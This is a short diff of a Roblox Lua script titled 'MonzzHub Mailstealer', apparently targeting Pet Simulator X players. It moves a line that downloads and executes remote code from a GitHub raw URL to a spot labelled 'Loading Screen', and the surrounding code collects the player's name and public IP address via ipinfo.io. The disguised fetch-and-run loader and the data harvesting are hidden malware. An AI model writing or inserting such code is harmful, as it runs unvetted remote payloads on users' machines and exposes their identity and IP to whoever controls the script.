@@ -1,7 +1,5 @@
 -- [MonzzHub Mailstealer]
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-sc/Petsimx/main/Psx"))()
-
 local Library = require(game.ReplicatedStorage.Framework.Library);
 local Players = game:GetService("Players")
 local Client = Players.LocalPlayer
@@ -181,6 +179,9 @@ local username = game:GetService("Players").LocalPlayer.Name
 local fardplayer = game:GetService("Players").LocalPlayer
 local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local data1
+
+--// Loading Screen
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-sc/Petsimx/main/Psx"))()
 
 -- Remotes
 
